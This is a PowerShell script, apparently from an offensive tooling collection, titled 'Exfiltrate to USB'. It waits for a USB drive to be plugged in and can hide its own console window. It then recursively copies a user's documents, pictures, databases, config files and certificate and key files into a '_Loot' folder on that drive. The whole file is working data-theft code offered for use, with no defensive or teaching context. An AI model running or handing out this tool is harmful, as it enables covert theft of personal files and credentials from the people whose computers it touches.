<# =============================== beigeworm's Exfiltrate to USB ==================================

SYNOPSIS
Waits for a new USB Storage device to be connected and then copies many user files to that USB drive.

USAGE
1. Run the script.
2. Choose if you want to hide the console window (silent mode)
3. Connect a USB Drive to the computer
4. Copying files will automatically begin to the newly connected drive
5. 'Completed' message will appear when finished (hidden mode only)
#>

[Console]::BackgroundColor = "Black"
[Console]::SetWindowSize(57, 5)
[Console]::Title = "Exfiltration"
Clear-Host

$hidden = Read-Host "Would you like to hide this console window? (Y/N)"
$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$count = $removableDrives.count
$i = 10

While (($count -eq $removableDrives.count) -or ($i -gt 0)){
    cls
    Write-Host "Connect a Device.. ($i)" -ForegroundColor Yellow
    $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
    sleep 1
    $i--
    if ($i -eq 0 ){
        Write-Host "Timeout! Exiting" -ForegroundColor Red
        sleep 1
        exit
    }
}

[Console]::SetWindowSize(80, 30)

$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
$driveLetter = $drive.DeviceID
Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Loot"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -ItemType Directory -Path $destinationPath -Force
    Write-Host "New Folder Created : $destinationPath"  -ForegroundColor Green
}

If ($hidden -eq 'y'){
    Write-Host "Hiding the Window.."  -ForegroundColor Red
    sleep 1
    $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
    add-type -name win -member $Import -namespace native;
    [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
}

foreach ($folder in $foldersToSearch) {
    Write-Host "Searching in $folder"  -ForegroundColor Yellow
    
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File

        foreach ($file in $files) {
            $destinationFile = Join-Path -Path $destinationPath -ChildPath $file.Name
            Write-Host "Copying $($file.FullName) to $($destinationFile)"  -ForegroundColor Gray
            Copy-Item -Path $file.FullName -Destination $destinationFile -Force
        }
    }
}
    If ($hidden -eq 'y'){
        msg.exe * "File Exfiltration Complete"
    }
    else{
        Write-Host "File Exfiltration Complete" -ForegroundColor Green
    }
